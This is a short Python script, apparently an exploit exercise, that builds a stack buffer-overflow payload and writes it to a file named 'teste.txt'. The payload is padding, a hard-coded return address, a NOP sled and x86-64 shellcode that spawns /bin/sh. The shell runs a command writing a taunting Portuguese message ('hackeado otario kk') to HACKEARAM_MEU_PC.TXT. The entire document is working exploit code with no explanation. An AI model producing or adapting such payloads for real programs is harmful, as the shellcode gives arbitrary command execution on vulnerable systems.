import struct

buf = b"\x41" * 21
buf += struct.pack("Q", 0x7fffffffdd20)
buf += b"\x90" * 1000
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
buf += b"\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x31"
buf += b"\x00\x00\x00\x65\x63\x68\x6f\x20\x27\x68\x65\x61"
buf += b"\x63\x6b\x61\x64\x6f\x20\x6f\x74\x61\x72\x69\x6f"
buf += b"\x20\x6b\x6b\x27\x20\x3e\x20\x48\x41\x43\x4b\x45"
buf += b"\x41\x52\x41\x4d\x5f\x4d\x45\x55\x5f\x50\x43\x2e"
buf += b"\x54\x58\x54\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f"
buf += b"\x05"
fo = open("teste.txt", 'wb+')
fo.write(buf)
fo.close()